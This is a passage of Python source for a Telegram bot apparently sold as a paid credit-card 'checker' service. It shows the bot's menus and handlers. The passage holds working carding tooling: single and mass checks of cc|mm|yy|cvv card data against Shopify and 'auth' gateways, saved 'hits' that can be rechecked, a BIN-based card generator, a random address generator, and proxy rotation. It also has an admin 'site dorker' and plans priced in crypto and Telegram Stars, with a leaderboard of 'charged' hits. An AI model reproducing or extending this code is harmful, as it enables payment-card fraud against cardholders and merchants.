        f"{pe('gem2')} <b>/redeem</b> <code>KEY</code> — {sc('Redeem Key')}\n"
        f"{pe('chat')} <b>/fb</b> <code>message</code> — {sc('Send Feedback')}\n"
        f"{pe('chat2')} <b>/iadmin</b> <code>message</code> — {sc('Message Admin')}\n"
        f"{pe('chart')} <b>/top</b> — {sc('Top Checkers')}\n"
        f"{pe('star')} <b>/start</b> — {sc('Main Menu')}\n"
        f"{pe('docs')} <b>/cmd</b> — {sc('This list')}"
        f"</blockquote>"
    )
    if is_admin(uid):
        admin_cmds = (
            f"\n{pe('settings')} <b>{sc('Admin Commands')}</b>\n"
            f"<blockquote>"
            f"{pe('settings')} <b>/panel</b> — {sc('Admin Panel')}\n"
            f"{pe('shop')} <b>/dork</b> <code>query</code> — {sc('Site Dorker')}\n"
            f"{pe('docs')} <b>/stats</b> — {sc('System Stats')}\n"
            f"{pe('refresh')} <b>/restore_done</b> — {sc('Force DB Restore')}\n"
            f"{pe('trash')} <b>/restore_clear</b> — {sc('Clear Restore Session')}"
            f"</blockquote>"
        )
        user_cmds += admin_cmds
    await msg.answer(user_cmds, parse_mode="HTML")

@router.message(Command("top"))
async def cmd_top(msg: Message):
    with db() as c: rows = c.execute("SELECT uid, username, total_hits FROM users WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    text = "🏆 <b>Top 10 Checkers</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for i, r in enumerate(rows, 1): text += f"{i}. <code>{r['uid']}</code> ({esc(r['username'] or 'N/A')}) ~ <b>{r['total_hits']} hits</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await msg.answer(text, parse_mode="HTML")

# ── USER CALLBACKS ───────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:main")
async def cb_main(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, '')
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS) 
    await safe_edit_media(cb, media, welcome_text(user, cb.from_user.first_name), main_menu_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "menu:close")
async def cb_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except: pass
    await cb.answer()

@router.callback_query(F.data == "menu:spin")
async def cb_spin(cb: CallbackQuery):
    uid = cb.from_user.id
    today = datetime.now(timezone.utc).date().isoformat()
    with db() as c:
        row = c.execute("SELECT last_credit_date FROM users WHERE uid=?", (uid,)).fetchone()
    if row and row["last_credit_date"] == today: return await cb.answer("You already spun today! Come back tomorrow.", show_alert=True)
    amount = random.choice([10, 25, 50, 100])
    with db() as c: c.execute("UPDATE users SET credits=credits+?, last_credit_date=? WHERE uid=?", (amount, today, uid))
    await cb.answer(f"🎰 You Won {amount} Credits!", show_alert=True)
    await cb_main(cb)

@router.callback_query(F.data == "menu:gift")
async def cb_gift(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "gift_credits")
    await edit_admin(cb, f"{pe('gem')} <b>{sc('Gift Credits')}</b>\n<blockquote>Usage: <code>@username amount</code>\nExample: <code>@Rahul 50</code></blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:top")
async def cb_top(cb: CallbackQuery):
    with db() as c: rows = c.execute("SELECT uid, username, total_hits FROM users WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    text = f"{pe('chart')} <b>Top 10 Checkers</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for i, r in enumerate(rows, 1): text += f"{i}. <code>{r['uid']}</code> ({esc(r['username'] or 'N/A')}) ~ <b>{r['total_hits']} hits</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:wishlist")
async def cb_wishlist(cb: CallbackQuery):
    uid = cb.from_user.id
    with db() as c: rows = c.execute("SELECT cc FROM saved_cards WHERE uid=? ORDER BY id DESC LIMIT 20", (uid,)).fetchall()
    if not rows: text = f"{pe('book')} <b>Wishlist</b>\n<blockquote>Your wishlist is empty. Save hits from your checks!</blockquote>"
    else:
        cards = [r["cc"] for r in rows]
        text = f"{pe('book')} <b>Wishlist ({len(cards)})</b>\n<blockquote><code>{chr(10).join(cards)}</code></blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Check All", icon="shop", color="success", callback_data="wishlist:check")], [pbtn("Back", icon="back", callback_data="menu:main")]])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "wishlist:check")
async def cb_wishlist_check(cb: CallbackQuery):
    uid = cb.from_user.id
    with db() as c: rows = c.execute("SELECT cc FROM saved_cards WHERE uid=? ORDER BY id DESC LIMIT 20", (uid,)).fetchall()
    if not rows: return await cb.answer("Wishlist is empty.", show_alert=True)
    cards = [r["cc"] for r in rows]
    await cb.answer("Starting mass check...")
    await run_mass_check(cb.message, cards, cb.bot, bypass_quota=is_admin(uid), mode="shopify")

@router.callback_query(F.data == "menu:info")
async def cb_info(cb: CallbackQuery):
    text = f"{pe('gem')} <b>[=] Info » Plans, Profile & Commands » {pe('gem')}</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('star')} <b>[=] Plans » View available plans & pricing » {pe('star')}</b>\n{pe('gem')} <b>[=] Profile » Account info, rank & stats » {pe('gem')}</b>\n{pe('up')} <b>[=] Commands » Full command reference guide » {pe('up')}</b>"
    await safe_edit_media(cb, random.choice(VIDEOS), text, info_menu_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:commands")
async def cb_commands(cb: CallbackQuery):
    text = f"{pe('up')} <b>[=] Commands » Reference » {pe('up')}</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('up')} <b>[=] Checker » {pe('up')}</b>\n<b>[=] <code>/sh</code> » cc|mm|yy|cvv</b>\n{pe('up')} <b>[=] <code>/msh</code> » Mass check</b>\n{pe('check')} <b>[=] Checks » Unlimited » {pe('check')}</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('gem')} <b>[=] Plan » {pe('gem')}</b>\n{pe('hourglass')} <b>[=] <code>/profile</code> » Profile</b>\n{pe('gem3')} <b>[=] <code>/redeem</code> » Redeem</b>\n{pe('star')} <b>[=] <code>/top</code> » Leaderboard</b>"
    await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:tools")
async def cb_tools(cb: CallbackQuery):
    text = f"{pe('up')} <b>[=] Tools » Checker & Hitter » {pe('up')}</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('up')} <b>[=] Shopify » Single & mass » {pe('up')}</b>\n{pe('link')} <b>[=] Proxy » Set, test & toggle » {pe('link')}</b>"
    await safe_edit_media(cb, random.choice(VIDEOS), text, tools_kb())
    await cb.answer()

@router.callback_query(F.data == "tool:bin")
async def cb_tool_bin(cb: CallbackQuery):
    text = (
        f"{pe('diamond')} <b>{sc('BIN Lookup')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('docs')} <b>{sc('Send BIN or use command')}:</b>\n"
        f"<blockquote>{pe('pen')} {sc('Command')}: <code>/bin 401234</code>\n"
        f"{pe('star')} {sc('Or send your BIN directly')}: <code>401234</code></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")]])
    try:
        await cb.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
    except:
        try:
            await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            await cb.message.answer(text, parse_mode="HTML", reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data == "tool:addr")
async def cb_tool_addr(cb: CallbackQuery):
    text = (
        f"{pe('user')} <b>{sc('Address Generator')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('docs')} <b>{sc('Use command to generate')}:</b>\n"
        f"<blockquote>{pe('pen')} {sc('Command')}: <code>/addr</code>\n"
        f"{pe('star')} {sc('Generates a random address worldwide')}</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Generate Now"), icon="refresh", color="success", callback_data="tool:addr_gen")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")]
    ])
    try:
        await cb.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
    except:
        try:
            await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            await cb.message.answer(text, parse_mode="HTML", reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data == "tool:format")
async def cb_tool_format(cb: CallbackQuery):
    text = (
        f"{pe('pen')} <b>{sc('CC Formatter')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('docs')} <b>{sc('Send CC or use command')}:</b>\n"
        f"<blockquote>{pe('pen2')} {sc('Command')}: <code>/format 4111111111111111|12|25|123</code>\n"
        f"{pe('star')} {sc('Accepts any separator')}: <code>|</code> <code> </code> <code>/</code> <code>-</code></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")]])
    try:
        await cb.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
    except:
        try:
            await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            await cb.message.answer(text, parse_mode="HTML", reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data == "tool:addr_gen")
async def cb_tool_addr_gen(cb: CallbackQuery):
    countries = [("US", "New York", "NY", "10001"), ("US", "Los Angeles", "CA", "90001"), ("UK", "London", "LDN", "EC1A"), ("CA", "Toronto", "ON", "M5V"), ("AU", "Sydney", "NSW", "2000"), ("DE", "Berlin", "BE", "10115"), ("FR", "Paris", "IDF", "75001"), ("JP", "Tokyo", "TK", "100-0001"), ("BR", "Sao Paulo", "SP", "01000"), ("IN", "Mumbai", "MH", "400001"), ("ZA", "Cape Town", "WC", "8001"), ("NG", "Lagos", "LA", "100001"), ("MX", "Mexico City", "CMX", "01000"), ("ES", "Madrid", "MD", "28001"), ("IT", "Rome", "RM", "00100"), ("RU", "Moscow", "MOW", "101000"), ("TR", "Istanbul", "IST", "34000"), ("AE", "Dubai", "DXB", "00000"), ("SG", "Singapore", "SG", "018956"), ("HK", "Hong Kong", "HK", "999077")]
    streets = ["Main St", "Park Ave", "Oak Dr", "Pine Ln", "Cedar Rd", "Maple Ct", "High St", "Station Rd", "Church Ln", "Victoria Rd"]
    country, city, state, zip_code = random.choice(countries)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    text = (
        f"{pe('user')} <b>{sc('Generated Address')} ({country})</b>\n"
        f"<blockquote>〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('link')} <b>{sc('Street')}:</b> <code>{street}</code>\n"
        f"{pe('shop')} <b>{sc('City')}:</b> <code>{city}</code>\n"
        f"{pe('diamond')} <b>{sc('State')}:</b> <code>{state}</code>\n"
        f"{pe('num1')} <b>{sc('ZIP')}:</b> <code>{zip_code}</code>\n"
        f"{pe('star')} <b>{sc('Country')}:</b> <code>{country}</code>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Generate Again"), icon="refresh", color="success", callback_data="tool:addr_gen")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")]
    ])
    try:
        await cb.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb)
    except:
        try:
            await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            await cb.message.answer(text, parse_mode="HTML", reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data.startswith("gen:"))
async def cb_gen(cb: CallbackQuery):
    try: await safe_edit_media(cb, random.choice(VIDEOS), f"{pe('check')} <b>10 {sc('Cards')}</b>\n<blockquote><code>{chr(10).join(generate_cc(cb.data.split(':')[1], 10))}</code></blockquote>", back_kb()); await cb.answer()
    except Exception as e: await cb.answer(f"Error: {e}", show_alert=True)

@router.callback_query(F.data == "menu:check")
async def cb_check_menu(cb: CallbackQuery):
    text = f"{pe('up')} <b>[=] Shopify Checker » {pe('up')}</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n<b>[=] Single » <code>/sh CC|MM|YY|CVV</code></b>\n<b>[=] Mass » <code>/msh</code></b>\n\n{pe('warn')} <b>[=] Proxy required for auth checks » {pe('warn')}</b>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Add Proxy", icon="add", color="success", callback_data="proxy:add")], [pbtn("Back", icon="back", callback_data="menu:tools")]])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "menu:auth_check")
async def cb_auth_check_menu(cb: CallbackQuery):
    text = (
        f"{pe('gem')} <b>{sc('Auth Checker')} » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<b>[=] {sc('Single')} » <code>/auth CC|MM|YY|CVV</code></b>\n"
        f"<b>[=] {sc('Mass')} » <code>/mauth</code></b>\n\n"
        f"{pe('warn')} <b>[=] {sc('Proxy required for auth checks')} » {pe('warn')}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")],
        [pbtn(sc("Back"), icon="back", callback_data="menu:main")]
    ])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "menu:proxy")
async def cb_proxy(cb: CallbackQuery):
    proxies = user_proxy_all(cb.from_user.id)
    live_count = sum(1 for p in proxies if p['status'] == 'live')
    text = (
        f"{pe('link')} <b>[=] {sc('Proxy Manager')} » {pe('link')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('online')} <b>[=] {sc('Live')} » {live_count}</b>\n"
        f"{pe('docs')} <b>[=] {sc('Total')} » {len(proxies)}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('warn')} <b>[=] {sc('Proxy required for Auth checks')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, proxy_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "proxy:add")
async def cb_proxy_add(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "add_proxy")
    text = (
        f"{pe('add')} <b>{sc('Add Proxies')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<blockquote>{pe('pen')} <b>{sc('Paste proxies — one per line')}:</b>\n"
        f"<code>user:pass@host:port</code>\n"
        f"<code>host:port:user:pass</code>\n"
        f"<code>socks5://user:pass@host:port</code></blockquote>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:proxy")]]))
    await cb.answer()

@router.callback_query(F.data == "proxy:check")
async def cb_proxy_check(cb: CallbackQuery):
    try: await cb.answer("Testing...")
    except: pass
    rows = user_proxy_all(cb.from_user.id)
    if not rows:
        await safe_edit_media(cb, random.choice(VIDEOS), f"{pe('warn')} <b>{sc('No proxies found')}</b>\n<blockquote>{pe('add')} {sc('Add proxies first')}</blockquote>", proxy_kb(cb.from_user.id))
        return
    # update caption to show testing status
    try:
        await cb.message.edit_caption(caption=f"{pe('loading')} <b>{sc('Testing')} {len(rows)} {sc('proxies')}...</b>", parse_mode="HTML")
    except:
        pass
    alive, dead, sem, now, lock = 0, 0, asyncio.Semaphore(PROXY_TEST_BATCH), datetime.now(timezone.utc).isoformat(), asyncio.Lock()
    async def t(p):
        nonlocal alive, dead
        async with sem:
            r = await check_proxy_hq(p)
            async with lock:
                if r.get("ok"):
                    with db() as c: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (r.get("latency",0), now, cb.from_user.id, p))
                    alive += 1
                else:
                    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (cb.from_user.id, p))
                    dead += 1
    await asyncio.gather(*(t(r["proxy"]) for r in rows))
    result_text = (
        f"{pe('check')} <b>{sc('Revalidated')}</b>\n"
        f"<blockquote>{pe('online')} {sc('Live')}: <b>{alive}</b>\n"
        f"{pe('cross2')} {sc('Removed')}: <b>{dead}</b></blockquote>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), result_text, proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "proxy:list")
async def cb_proxy_list(cb: CallbackQuery):
    try: await cb.answer()
    except: pass
    rows = user_proxy_all(cb.from_user.id)
    if not rows:
        await safe_edit_media(cb, random.choice(VIDEOS), f"{pe('warn')} <b>{sc('No proxies found')}</b>\n<blockquote>{pe('add')} {sc('Add proxies first')}</blockquote>", proxy_kb(cb.from_user.id))
        return
    lines = [f"{pe('docs')} <b>{sc('Your Proxies')} ({len(rows)})</b>\n<blockquote>"]
    for r in rows[:25]:
        if r["status"] == "live": icon = pe("check")
        elif r["status"] == "dead": icon = pe("cross2")
        else: icon = pe("warn")
        latency = f"{r['latency']:.2f}s" if r.get("latency") else "—"
        display = esc(proxy_display(r["proxy"])[:45])
        lines.append(f"{icon} <code>{display}</code> · {latency}")
    if len(rows) > 25: lines.append(f"<i>...{sc('and')} {len(rows)-25} {sc('more')}</i>")
    lines.append("</blockquote>")
    await safe_edit_media(cb, random.choice(VIDEOS), "\n".join(lines), proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "proxy:clear")
async def cb_proxy_clear(cb: CallbackQuery):
    try: await cb.answer()
    except: pass
    clear_user_proxies(cb.from_user.id)
    text = (
        f"{pe('trash')} <b>{sc('All Proxies Cleared')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<blockquote>{pe('online')} {sc('Live')}: <b>0</b>\n"
        f"{pe('docs')} {sc('Total')}: <b>0</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('warn')} <b>{sc('Proxy required for Auth checks')}</b></blockquote>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "menu:account")
async def cb_account(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    pk, unlimited = (user["plan"] if user["plan"] in PLANS else "free"), (is_admin(cb.from_user.id) or user["plan"] in ("premium", "max", "unlimited"))
    text = (
        f"{pe('chat2')} <b>[=] Profile » User Info » {pe('chat2')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<b>[=] Name » <i>{esc(cb.from_user.first_name)}</i> «</b>\n"
        f"{pe('link')} <b>[=] Handle » @{esc(cb.from_user.username or 'N/A')} » {pe('link')}</b>\n"
        f"{pe('diamond')} <b>[=] ID » {cb.from_user.id} » {pe('diamond')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('chat2')} <b>[=] Role » {sc('Admin' if is_admin(cb.from_user.id) else 'Free User')} » {pe('chat2')}</b>\n"
        f"{pe('cross2')} <b>[=] Plan » {sc(PLANS[pk]['name']) if pk != 'free' else 'No Plan'} » {pe('cross2')}</b>\n"
        f"{pe('hourglass')} <b>[=] Expires » {sc('Never' if pk == 'unlimited' or not user['premium_until'] else user['premium_until'][:10])} » {pe('hourglass')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('cross2')} <b>[=] Proxies » {len(user_proxy_all(cb.from_user.id)) if user_proxy_all(cb.from_user.id) else 'Not Set'} » {pe('cross2')}</b>\n"
        f"{pe('chart')} <b>[=] Rank » {sc('God' if user['total_hits'] > 500 else 'Hitter' if user['total_hits'] > 50 else 'Noob')}</b>\n"
        f"{pe('check')} <b>[=] Charged » {user['total_hits']} » {pe('check')}</b>\n"
        f"{pe('gem3')} <b>[=] Redeem » /redeem KEY » {pe('gem3')}</b>\n"
        f"{pe('star')} <b>[=] Plans » /plans » {pe('star')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:shop")
async def cb_shop(cb: CallbackQuery):
    pw = get_setting('price_weekly', '10')
    pm = get_setting('price_monthly', '30')
    text = (
        f"{pe('gem')} <b>[=] Plans » Access Plans » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('check')} <b>[=] Checks » Unlimited - no credit deduction » {pe('check')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('star')} <b>[=] Trial » Free » {pe('star')}</b>\n"
        f"{pe('hourglass')} <b>[=] Duration » {get_setting('trial_hours', '3')} Hours » {pe('hourglass')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('gem')} <b>[=] Weekly » ${pw} » {pe('gem')}</b>\n"
        f"{pe('hourglass')} <b>[=] Duration » 7 Days » {pe('hourglass')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('up')} <b>[=] Bi-Weekly » $18 » {pe('up')}</b>\n"
        f"{pe('hourglass')} <b>[=] Duration » 15 Days » {pe('hourglass')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('check')} <b>[=] Monthly » ${pm} » {pe('check')}</b>\n"
        f"{pe('hourglass')} <b>[=] Duration » 30 Days » {pe('hourglass')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('gem3')} <b>[=] Redeem » /redeem KEY » {pe('gem3')}</b>\n"
        f"{pe('link')} <b>[=] Contact » <i>Adelina</i> » {pe('link')}</b>"
    )
    await safe_edit_media(cb, random.choice(VIDEOS), text, shop_kb())
    await cb.answer()

@router.callback_query(F.data == "shop:buy_usdt")
async def cb_buy_usdt(cb: CallbackQuery):
    wallet = get_setting("wallet_usdt", "Not Set")
    await cb.answer(f"Send payment to: {wallet}\nAfter paying, send screenshot to admin.", show_alert=True)

@router.callback_query(F.data == "shop:buy_ton")
async def cb_buy_ton(cb: CallbackQuery):
    wallet = get_setting("wallet_ton", "Not Set")
    await cb.answer(f"Send payment to: {wallet}\nAfter paying, send screenshot to admin.", show_alert=True)

@router.callback_query(F.data == "verify_sub")
async def cb_verify(cb: CallbackQuery):
    if await check_force_sub(cb.bot, cb.from_user.id):
        try: await cb.message.delete()
        except: pass
        user, streak = get_user_or_create(cb.from_user.id, cb.from_user.username or ""), apply_streak(cb.from_user.id)
        user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
        caption = welcome_text(user, cb.from_user.first_name) + (f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}" if streak["reward"] else "")
        media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS) 
        try: await cb.bot.send_video(chat_id=cb.from_user.id, video=media, caption=caption, parse_mode="HTML", reply_markup=main_menu_kb(cb.from_user.id))
        except: pass
    else: await cb.answer("Join all channels first", show_alert=True)
    try: await cb.answer()
    except: pass

@router.callback_query(F.data.startswith("buy:"))
async def cb_buy(cb: CallbackQuery):
    prod = STAR_PRODUCTS.get(cb.data.split(":", 1)[1])
    if not prod: return await cb.answer("Invalid", show_alert=True)
    try: await cb.bot.send_invoice(chat_id=cb.from_user.id, title=f"Noval · {prod['label']}", description=f"{prod['plan'].title()} for {prod['days']}d", payload=f"plan:{prod['plan']}:{prod['days']}", provider_token="", currency="XTR", prices=[LabeledPrice(label=prod["label"], amount=prod["stars"])])
    except Exception as e: return await cb.answer(f"Error: {e}", show_alert=True)
    await cb.answer()

@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    try: await q.answer(ok=True)
    except: pass

@router.message(F.successful_payment)
async def on_paid(msg: Message):
    sp = msg.successful_payment
    if not sp: return
    ensure_user(msg.from_user.id, msg.from_user.username or "")
    parts = (sp.invoice_payload or "").split(":")
    if len(parts) == 3 and parts[0] == "plan":
        try: days = int(parts[2])
        except: days = 30
        upgrade_user(msg.from_user.id, parts[1], days)
        try: await msg.answer(f"{pe('check')} <b>{sc('Paid')}</b>\n<blockquote>{pe('gem')} <b>{PLANS[parts[1]]['name']}</b> · {days}d</blockquote>", parse_mode="HTML")
        except: pass

@router.callback_query(F.data.startswith("recheck:"))
async def cb_recheck(cb: CallbackQuery):
    cc = cb.data.split(":", 1)[1]
    try: await cb.answer("Rechecking...")
    except: pass
    if CC_REGEX.match(cc): await process_check_logic(cb.message, cc, cb.bot, uid=cb.from_user.id, username=cb.from_user.username or "")

@router.callback_query(F.data.startswith("save:"))
async def cb_save(cb: CallbackQuery):
    with db() as c: c.execute("INSERT OR IGNORE INTO saved_cards(uid, cc, saved_at) VALUES (?,?,?)", (cb.from_user.id, cb.data.split(":", 1)[1], datetime.now(timezone.utc).isoformat()))
    await cb.answer("Saved to Wishlist")

@router.callback_query(F.data.startswith("mc:cancel:"))
async def cb_mc_cancel(cb: CallbackQuery):
    ev = _mass_tasks.get(cb.data.split(":", 2)[2])
    if ev: ev.set(); await cb.answer("Cancelling...")
    else: await cb.answer("Done")

@router.callback_query(F.data.startswith("mass:start:"))
async def cb_mass_start(cb: CallbackQuery):
    _cleanup_pending_mass()
    parts = cb.data.split(":")
    if len(parts) == 4: mode, token = parts[2], parts[3]
    else: mode, token = "shopify", parts[2]
    entry = _pending_mass.pop(token, None)
    if not entry: return await cb.answer("Expired — paste cards again", show_alert=True)
    if entry["uid"] != cb.from_user.id: return await cb.answer("Not yours", show_alert=True)
    cards = entry["cards"]
    await cb.answer(f"Starting {len(cards)}...")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    if len(cards) == 1:
        # single card — use proper single checker with animation
        await process_check_logic(cb.message, cards[0], cb.bot, uid=cb.from_user.id, username=cb.from_user.username or "", mode=mode)
    else:
        await run_mass_check(cb.message, cards, cb.bot, bypass_quota=is_admin(cb.from_user.id), uid=cb.from_user.id, username=cb.from_user.username or "", mode=mode)

@router.callback_query(F.data.startswith("mass:cancel:"))
async def cb_mass_cancel(cb: CallbackQuery):
    _pending_mass.pop(cb.data.split(":", 2)[2], None)
    try: await cb.message.delete()
    except: pass
    await cb.answer("Cancelled")

# ── ADMIN CALLBACKS ─────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:admin_panel")
@router.callback_query(F.data == "admin:main")
async def cb_admin_main(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not admin", show_alert=True)
    set_awaiting(cb.from_user.id, '')
    if is_limited_admin(cb.from_user.id) and not is_full_admin(cb.from_user.id):
        await edit_admin(cb, f"{pe('settings')} <b>{sc('Admin Panel')}</b>\n<blockquote>{pe('user')} {sc('Limited Admin')}</blockquote>", admin_main_kb(cb.from_user.id))
        return await cb.answer()
    await edit_admin(cb, f"{pe('settings')} <b>{sc('Admin Panel')}</b>", admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        total_users = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
        total_checks = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        total_hits = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"]
        today_date = datetime.now(timezone.utc).date().isoformat()
        today_checks = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE ts LIKE ?", (f"{today_date}%",)).fetchone()["n"]
        charged_hits = c.execute("SELECT COUNT(*) as n FROM charged_hits").fetchone()["n"]
        total_proxies = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE status='live'").fetchone()["n"]
        db_size = os.path.getsize(DB_PATH) / (1024 * 1024) if os.path.exists(DB_PATH) else 0
    text = f"📊 <b>[=] Master Dashboard</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n👥 <b>Users</b> ~ {total_users:,}\n🛒 <b>Total Checks</b> ~ {total_checks:,}\n📅 <b>Today Checks</b> ~ {today_checks:,}\n✅ <b>Total Hits</b> ~ {total_hits:,}\n💎 <b>Charged Hits</b> ~ {charged_hits:,}\n🔗 <b>Live Proxies</b> ~ {total_proxies:,}\n💾 <b>DB Size</b> ~ {db_size:.2f} MB</blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:assets")
async def cb_admin_assets(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = f"{pe('docs')} <b>[=] Assets Manager</b>\n<blockquote>Current Main Image:\n<code>{get_setting('asset_IMG_MAIN')}</code></blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Change Main Image", icon="pen", color="success", callback_data="admin:set_asset:asset_IMG_MAIN")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_asset:"))
async def cb_admin_set_asset_prompt(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    key = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"set_asset:{key}")
    await edit_admin(cb, f"{pe('pen')} Send photo or URL for <b>{key}</b>:", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:sites")
async def cb_admin_sites(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
